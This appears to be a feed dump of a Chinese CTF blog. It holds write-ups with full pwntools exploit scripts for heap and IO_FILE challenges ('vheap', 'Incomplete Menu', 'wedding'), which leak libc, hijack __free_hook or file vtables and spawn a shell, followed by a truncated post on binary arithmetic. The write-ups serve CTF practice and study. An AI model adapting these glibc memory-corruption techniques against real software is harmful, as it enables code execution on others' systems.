+&#x3D; b&quot;&#x2F;bin&#x2F;sh\x00&quot; + b&#39;X&#39; * 32 + p64(0xdeadbeef) + b&#39;X&#39; * 8 + p64(0xbeefdead) + p64(execve) + p64(execve)    fake_iofile &#x3D; fake_iofile.ljust(0x500, b&quot;\x00&quot;)    ### fake meta    fake_meta &#x3D; p64(fake_iofile_ptr) + p64(stdout_used) # prev, next    fake_meta +&#x3D; p64(fake_group_ptr)    fake_meta +&#x3D; p64((1 &lt;&lt; 1)) + p64((20 &lt;&lt; 6) | (1 &lt;&lt; 5) | 1 | (0xfff &lt;&lt; 12))    fake_meta &#x3D; fake_meta.ljust(0x30)    ### final payload    payload &#x3D; b&quot;z&quot;*(0x1000-0x20)    payload +&#x3D; fake_area + fake_meta + fake_group + fake_iofile    payload &#x3D; payload.ljust(0x2000, b&quot;z&quot;)    add(b&quot;B&quot;*0x4, payload) # check this        delete(b&quot;A&quot;*0x4)    for i in range(7):        find(b&quot;x&quot;*0x28)    ## ------------  build fake_note ------------    fake_note &#x3D; p64(heap_base+0x4960) + p64(fake_iofile_ptr) # name(d-&gt;content &quot;dddd&quot;), content(free it to unlink!!!)    fake_note +&#x3D; p64(4) + p64(4) # name_size, content_size    fake_note +&#x3D; p64(0) # next-&gt;null    add(b&quot;C&quot;*0x4, fake_note) # C occupy last chunk    add(b&quot;D&quot;*0x4, b&quot;d&quot;*4) # D    #gdb.attach(p, &quot;dir .&#x2F;musl-1.2.2&#x2F;src&#x2F;malloc\ndir .&#x2F;musl-1.2.2&#x2F;src&#x2F;malloc&#x2F;mallocng\nb free&quot;)    #pause()        delete(b&quot;d&quot;*0x4)    p.sendline(b&quot;5&quot;)        p.interactive()if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    exp()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnhub五月公开赛</title>
      <link href="/posts/18343.html"/>
      <url>/posts/18343.html</url>
      
        <content type="html"><![CDATA[<h2 id="vheap"><a href="#vheap" class="headerlink" title="vheap"></a>vheap</h2><p>个人感觉这道题目有点类似VMpwn，首先有一个格式化字符串漏洞泄露地址，相当于直接把libc基地址给我们了。之后让我们输入数据。我们选择输入两组数据，一组输入用于溢出free_hook，另一组单独填写system的地址。之后我们输入指令，指令为一个int类型的数字，int类型占用4字节，最多可以输入9组指令，即9个int数字。然后将我们输入的数据进行解析，并按照相应的解析进行操作。</p><p><img src="/../pictures/pwnhub%E4%BA%94%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512141550.png"></p><p>从这个解析函数来看，主要就是这三个带有注释的操作比较重要，<del>个人感觉其他的并没有什么用处</del>。很明显我们只能申请两个堆块，然后不管申请的堆块大小，我们都可以将之前的输入数据拷贝到堆上，因此这里有的明显的溢出。思路就比较简单了，直接溢出修改释放的堆块的fd指针，去打free_hook就行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;remote(&quot;121.40.89.206&quot;,33468)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;pwnhub春季赛&#x2F;vheap&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.5_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def get_code(HIBYTE,SBYTE2,SBYTE1,chars):    code&#x3D;(HIBYTE&lt;&lt;(8*3))+(SBYTE2&lt;&lt;(8*2))+(SBYTE1&lt;&lt;(8*1))+chars    return coder.recvuntil(&quot;first,tell me your name.&quot;)r.sendline(&quot;%20$p&quot;)r.recvuntil(&quot;:&quot;)libc_base&#x3D;int(r.recvuntil(b&quot;\n&quot;)[:-1],16)-231-libc.symbols[&#39;__libc_start_main&#39;]success(&quot;libc_base &#x3D; &quot;+hex(libc_base))free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]r.recvuntil(&quot;How many pieces of data?&quot;)r.sendline(&quot;2&quot;)payload&#x3D;b&quot;&#x2F;bin&#x2F;sh\x00&quot;.ljust(0x10,b&quot;a&quot;)+p64(0)+p64(0x21)+p64(free_hook)r.sendline(payload)pause()r.sendline(p64(system_addr))def add(index,size):    code&#x3D;get_code(0xa,0,size,index)    return codedef edit(index,data_index):    code&#x3D;get_code(0xb,data_index,0,index)    return codedef delete(index):    code&#x3D;get_code(0xc,0,0,index)    return coder.recvuntil(&quot;:&quot;)r.sendline(&quot;8&quot;)r.recvuntil(&quot;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&quot;)ints1&#x3D;add(0,0x18)ints2&#x3D;add(1,0x18)ints3&#x3D;delete(1)ints4&#x3D;edit(0,0)ints5&#x3D;add(1,0x18)ints6&#x3D;add(1,0x18)ints7&#x3D;edit(1,1)ints8&#x3D;delete(0)r.sendline(str(ints1))r.sendline(str(ints2))r.sendline(str(ints3))r.sendline(str(ints4))r.sendline(str(ints5))r.sendline(str(ints6))r.sendline(str(ints7))r.sendline(str(ints8))r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/pwnhub%E4%BA%94%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512142742.png"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两道IO_FILE题目总结</title>
      <link href="/posts/43930.html"/>
      <url>/posts/43930.html</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow-Incomplete-Menu"><a href="#ctfshow-Incomplete-Menu" class="headerlink" title="ctfshow Incomplete Menu"></a>ctfshow Incomplete Menu</h2><p>wp链接：<a href="https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh?from=from_copylink">https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh?from=from_copylink</a></p><p>这里不再对文件进行详细分析，简单来说就是edit函数里面存在数组越界，可以写入一个字节的 ’\x00‘，但是一个堆块只能编辑一次，总共只能申请5个堆块，但是对于申请堆块的大小不做限制。</p><p>看了大佬给的wp后，思路是先修改_IO_2_1_stdout_来泄露地址，然后修改_IO_2_1_stdin_来实现任意地址写，伪造IO_FILE结构体进行FSOP劫持。</p><p>直接粘贴大佬的wp了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;ctfshow&#x2F;卷王杯&#x2F;Incomplete_Menu&#x2F;pwn&quot;)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;ctfshow&#x2F;卷王杯&#x2F;Incomplete_Menu&#x2F;pwn&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def add(size):    r.sendlineafter(&quot;Please input your choice &gt;&gt; &quot;,&#39;1&#39;)    r.recvuntil(&quot;Please input the size of your heap &gt;&gt; &quot;)    r.sendline(str(size))def edit(index,size,content):    r.sendlineafter(&quot;Please input your choice &gt;&gt; &quot;,&#39;2&#39;)    r.recvuntil(&quot;Please input the index of your heap &gt;&gt; &quot;)    r.sendline(str(index))    r.recvuntil(&quot;Please input the length of content &gt;&gt; &quot;)    r.sendline(str(size))    r.recvuntil(&quot;Please input the content &gt;&gt; &quot;)    r.send(content)def add_x(size):    r.sendline(&#39;1&#39;)    sleep(0.1)    r.sendline(str(size))def edit_x(index,size,content):    r.sendline(&#39;2&#39;)    sleep(0.1)    r.sendline(str(index))    sleep(0.1)    r.sendline(str(size))    sleep(0.1)    r.send(content)def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offset# gdb.attach(r,&quot;b *0x55555555566e&quot;)# pause()add(0x200000)edit(0,0x201000+libc.symbols[&#39;_IO_2_1_stdout_&#39;]+1,&#39;\n&#39;)# pause()add_x(0x200000)# pause()edit_x(1,0x201000*2+libc.symbols[&quot;_IO_2_1_stdout_&quot;]+0x10+1,&#39;\n&#39;)base_addr&#x3D;u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x3ed8b0success(&quot;base_addr&#x3D;&quot;+hex(base_addr))bin_sh_addr&#x3D;base_addr+libc.search(b&#39;&#x2F;bin&#x2F;sh\x00&#39;).__next__()payload&#x3D;p64(0)*5+p64(1)+p64(0)+p64(bin_sh_addr)payload&#x3D;payload.ljust(0xd8,b&#39;\x00&#39;)+p64(base_addr+get_IO_str_jumps()-8)payload +&#x3D; p64(0)+p64(base_addr+libc.symbols[&#39;system&#39;])gdb.attach(r,&quot;b *0x55555555566e\n b exit&quot;)pause()add(0x200000)edit(2,0x201000*3+libc.symbols[&#39;_IO_2_1_stdin_&#39;]+0x38-0x10+1,payload)payload &#x3D; p64(0xfbad208b) # _flagspayload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;] + 132) # _IO_read_ptrpayload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;]) * 6payload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;] + 0x10) # _IO_buf_endpayload &#x3D; payload.ljust(132, b&#39;\x00&#39;) + p64(base_addr - (0x201000 * 3 - 0x10))r.sendlineafter(&quot;&gt;&gt; &quot;, payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想记录的有几点：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大佬定义了这个函数是用来找_IO_str_jumps_在libc中的偏移的，后来从网上找了一下，_好像是说因为_IO_str_jumps不能直接通过libc.symbols[‘_IO_str_jumps’]找到偏移，因此需要自己找一下。调试的时候我发现IO_str_jumps就在IO_file_jumps下面</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220507020934.png"></p><p>先从修改_IO_2_1_stdout_开始，修改_IO_2_1_stdout_用了两次刷零的机会，泄露了libc地址。</p><p>先放上其他大佬总结的泄露地址应满足的条件：</p><ol><li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>即<code>_flag &amp;~ 0x8</code>。</li><li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>即<code>_flag | 0x800</code></li><li>设置<code>_fileno</code>为1。</li><li>设置<code>_IO_write_base</code>指向想要泄露的地方；<code>_IO_write_ptr</code>指向泄露结束的地址。</li><li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code>或设置<code>_flag &amp; _IO_IS_APPENDING</code>即<code>_flag | 0x1000</code>。</li><li>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（非必须）。</li></ol><p>第一次将 ‘\x00’ 刷在了_IO_read_end_的末位一字节上，第二次将 ‘\x00’ 刷在了_IO_write_base的末位两字节上。这样就泄露了0xe3个字节的信息，可以泄露出libc基地址。</p><p>泄露完地址后，就利用修改IO_2_1_stdin来实现任意地址写，在修改IO_2_1stdin的IO_buf_base的末位字节为 ‘\x00’ 后，IO_buf_base指向IO_2_1_stdin，调用fgets函数时，就会向IO_2_1_stdin读入数据，由于IO_buf_base与IO_buf_end相差132，因此最多读入132个字节。当读满132个字节后，就会向IO_buf_base中读入数据，由于之前我们伪造了IO_buf_base，因此可以实现任意地址写。这里我们是采用FSOP的方法，劫持exit函数，使其调用IO_str_finsh，并且将flags设置为0，IO_buf_base设置为bin_sh_addr，然后将IO_list_all指向的伪造的IO_FILE_plus结构体+0xe8处放上system_addr，这样在调用IO_str_finsh时会调用system(“&#x2F;bin&#x2F;sh”)。</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/Inked%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220507235348_LI.jpg"></p><p>这里附上大佬总结的exit劫持为IO_str_finsh的调用过程和满足条件：</p><p>所以可以像下面这样构造：</p><ul><li>fp-&gt;_mode &#x3D; 0</li><li>fp-&gt;_IO_write_ptr &#x3D; 0xffffffff</li><li>fp-&gt;_IO_write_base &#x3D; 0</li><li>fp-&gt;_wide_data-&gt;_IO_buf_base &#x3D; bin_sh_addr （也就是 fp-&gt;_IO_write_end）</li><li>fp-&gt;_flags2 &#x3D; 0</li><li>fp-&gt;_mode &#x3D; 0</li></ul><p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_finish</code>。</p><h2 id="2022DASCTF-X-SU-wedding"><a href="#2022DASCTF-X-SU-wedding" class="headerlink" title="2022DASCTF_X_SU wedding"></a>2022DASCTF_X_SU wedding</h2><p>wp：<a href="https://www.cnblogs.com/LynneHuan/p/16070118.html">https://www.cnblogs.com/LynneHuan/p/16070118.html</a></p><p>这篇主要参考了这个大佬的wp进行了复现，<del>（其实就是把大佬的exp抄了一遍）</del>，<del>大佬这道题用了三种方法，我太菜了，只抄了一遍第二种方法</del>。这道题也是主要运用了数组越界的漏洞，首先利用preapare函数修改IO_2_1_stdout的flags和IO_write_base，分别写了一个0x135和0x1314，这样下次就可以泄露大量数据，由于修改了IO_write_base的两个字节，因此每次泄露的数据不固定，大佬找到了一个地址附近同时泄露了elf_base，libc_base和heap_base（这三个基地址后续我们都会用到），但是关闭ASLR时无法泄露大佬找到的那个地址。然后就是我们想要实现任意地址写，由于第二个revise函数给了限制写入次数的条件，因此我们想要先修改掉统计次数的两个变量。我们还有一次preapare的机会，我们利用这次机会修改size[index]的处的值&gt;0x999，这样我们就可以读入8个字节从而一次修改两个变量，然后我们利用revise函数将统计次数的两个变量改为较小的负数，这样我们就获得了多次修改的机会。</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/Inked%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220508002342_LI.jpg"></p><p>我们在修改size[index]的时候申请了一个0x110大小的堆块，我们利用现在多次编辑的函数，在上面写入0x2000用于作为下一次判断size[index]的大小的位置，这样我们下次我们就可以写入8个字节而不是3个字节。之后我们计算好偏移，申请适量的堆块，使得最后一次申请到的地址刚好满足在heap[index]处。而申请的堆块超过7个后，每次申请的堆块都会在0处，这样我们就实现了任意地址写的机会。大佬的思路是劫持puts函数调用_IO_str_finish，下面是大佬劫持的思路：</p><ul><li>继续使用跳板，将<code>stderr-&gt;vtable</code>修改为<code>_IO_str_jumps</code>；将<code>_IO_2_1_stderr_+131</code>处修改为<code>sh;</code>；将<code>__free_hook</code>修改为<code>system</code>；将<code>stderr-&gt;flags</code>修改为<code>0x80</code>；最后把<code>bss</code>段上的<code>stdout</code>修改为<code>_IO_2_1_stderr_</code>。接着，在调用<code>puts(xxx)</code>的时候，会调用<code>stderr-&gt;vtable-&gt;_IO_file_xsput</code>，实际调用的是<code>_IO_str_finish</code>，接着调用<code>free(fp-&gt;_IO_buf_base)</code>，就是调用<code>system(&quot;sh;&quot;)</code></li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;2022DASCTF_X_SU&#x2F;wedding_room&#x2F;wedding_room&quot;)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;2022DASCTF_X_SU&#x2F;wedding_room&#x2F;wedding_room&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.31-0ubuntu9.7_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offsetdef add(size, length&#x3D;None):    r.sendlineafter(&quot;&gt;&gt; \n&quot;, &#39;1&#39;)    if size &gt; 0x7fffffff:        size -&#x3D; (0x1 &lt;&lt; 32)    r.sendafter(&quot;&gt;&gt; \n&quot;, str(size).ljust(8,&#39;\x00&#39;))    if length is not None:        r.sendafter(&quot;&gt;&gt; \n&quot;, str(length).ljust(8,&#39;\x00&#39;))    def edit(index, content&#x3D;None):    r.sendlineafter(&quot;your choice &gt;&gt; \n&quot;, &#39;2&#39;)    r.sendlineafter(&quot;which packet you want to revise&gt;&gt; \n&quot;, str(index))    r.sendafter(&quot;now write your wish&gt;&gt; \n&quot;, content)def dbg():    gdb.attach(r,&quot;b *$rebase(0x162A)\n b *$rebase(0x15BD)&quot;)    pause()off_first &#x3D; 0x42ff0# dbg()add(0x40000,off_first + libc.symbols[&#39;_IO_2_1_stdout_&#39;]+1)add(0x40000, off_first + 0x83ff0 - 0x42ff0 + libc.sym[&#39;_IO_2_1_stdout_&#39;] + 0x20)r.recvuntil(p64(0xfffffffffffffff8), timeout&#x3D;5)m1 &#x3D; r.recv(0x10)r.recvuntil(p64(0xffffffffffffff78), timeout&#x3D;5)m2 &#x3D; r.recv(0x2d8)elf_base&#x3D;u64(m1[:8])-0x4040libc_base&#x3D;u64(m1[8:0x10])-0x1f1530heap_base&#x3D;u64(m2[-8:])success(&quot;elf_base &#x3D; &quot;+hex(elf_base))success(&quot;libc_base &#x3D; &quot;+hex(libc_base))success(&quot;heap_base &#x3D; &quot;+hex(heap_base))free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]IO_2_1_stderr&#x3D;libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;]IO_str_jumps&#x3D;libc_base+get_IO_str_jumps()edit(-19,p64(elf_base+0x4050)[:3])dbg()target_addr &#x3D; elf_base + 0x4015heap_addr &#x3D; heap_base + 0x2a0success(&quot;d &#x3D; &quot;+hex(target_addr-heap_addr))assert len(str(target_addr-heap_addr)) &lt;&#x3D; 8, &quot;try again&quot;add(0x100, target_addr-heap_addr)# dbg()edit(-19, p32(0xff000000)*2) edit(2,p16(0x2000))#通过申请适量的堆块，使得可以写入想要修改的地址，通过size的验证。size_addr&#x3D;elf_base+0x4060elf_heap_addr&#x3D;elf_base+0x40a0size_index&#x3D;(heap_addr-size_addr)&#x2F;&#x2F;4over_read_addr&#x3D;(8*size_index)+elf_heap_addrtop_chunk&#x3D;heap_base+0x3a0distance&#x3D;over_read_addr-top_chunk-0x10success(&quot;distance &#x3D; &quot;+hex(distance))count&#x3D;2malloc_size&#x3D;0x10010while True:    times,heap_size&#x3D;divmod(distance,malloc_size)    if heap_size&#x3D;&#x3D;0 or heap_size&gt;&#x3D;0x20:        break    else:        malloc_size -&#x3D; 0x10for i in range(times):    add(malloc_size-0x10)    count+&#x3D;1if heap_size:    add(heap_size-0x10)    count+&#x3D;1add(0x1000) #target_heapcount+&#x3D;1if count&gt;7:    count&#x3D;0# pause()# dbg()edit(count,p64(free_hook))edit(size_index,p64(system_addr))edit(count,p64(IO_2_1_stderr+216))edit(size_index,p64(IO_str_jumps-0x28))edit(count,p64(IO_2_1_stderr+131))edit(size_index,&#39;sh;&#39;)edit(count,p64(IO_2_1_stderr))edit(size_index,p8(0x80))edit(count,p64(elf_base+0x4020))edit(size_index,p64(IO_2_1_stderr))r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#">https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/16070118.html">https://www.cnblogs.com/LynneHuan/p/16070118.html</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write</a></p><p><a href="https://forum.butian.net/share/1516">https://forum.butian.net/share/1516</a></p><p><a href="https://www.shuzhiduo.com/A/gVdnM6DD5W/">https://www.shuzhiduo.com/A/gVdnM6DD5W/</a></p><p><a href="https://www.cnblogs.com/pwnfeifei/p/15793432.html">https://www.cnblogs.com/pwnfeifei/p/15793432.html</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop#fsop">https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop#fsop</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-4.13_io_file.md">https://www.bookstack.cn/read/CTF-All-In-One/doc-4.13_io_file.md</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机组二进制运算总结</title>
      <link href="/posts/45720.html"/>
      <url>/posts/45720.html</url>
      
        <content type="html"><![CDATA[<h2 id="加法减法运算"><a href="#加法减法运算" class="headerlink" title="加法减法运算"></a>加法减法运算</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[X]补 + [Y]补 = [X+Y]补[X]补 - [Y]补 = [X-Y]补进位产生的超出机器字长的部分，舍掉（被模掉了）溢出判断方法：单符号位判断法：    结果符号判断法：        同号相加：结果符号与被加数相异则溢出        异号相减：结果符号与被减数相异则溢出    进位符号判断法：        数值最高进位值与符号位进位相异则溢出双符号位判别法（通过实现变形补码实现）：    双符号位参与运算，结果双符号位相异则溢出    00：正数11：负数01：正溢出10：负溢出    第一位符号位为运算结果的真正符号位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="浮点数表示范围"><a href="#浮点数表示范围" class="headerlink" title="浮点数表示范围"></a>浮点数表示范围</h2><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004244.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004323.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004558.png" alt="微信图片_20220505004558"></p><h2 id="乘法运算"><a href="#乘法运算" class="headerlink" title="乘法运算"></a>乘法运算</h2><h3 id="原码乘法"><a href="#原码乘法" class="headerlink" title="原码乘法"></a>原码乘法</h3><h4 id="原码一位乘法"><a href="#原码一位乘法" class="headerlink" title="原码一位乘法"></a>原码一位乘法</h4><pre class="line-numbers language-none"><code class="language-none">符号位单独处理：X0⊕Y0乘数当前末位为0，加0后部分积右移一位；乘数当前末位为1，加|X|后部分积右移一位。最后一次相加后的结果也要右移，有几位就要右移几次部分积采用双符号位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505005230.png"></p><h4 id="原码两位乘法"><a href="#原码两位乘法" class="headerlink" title="原码两位乘法"></a>原码两位乘法</h4><pre class="line-numbers language-none"><code class="language-none">1.原码两位乘法和原码一位乘法一样，符号位不参加运算2.部分积和被乘数x均采用三位符号，乘数y末位每次要加一个c，c一开始是03.根据如下法则进行运算：    · 000 -》 部分积加0，   右移两位，c变为0    · 001 -》 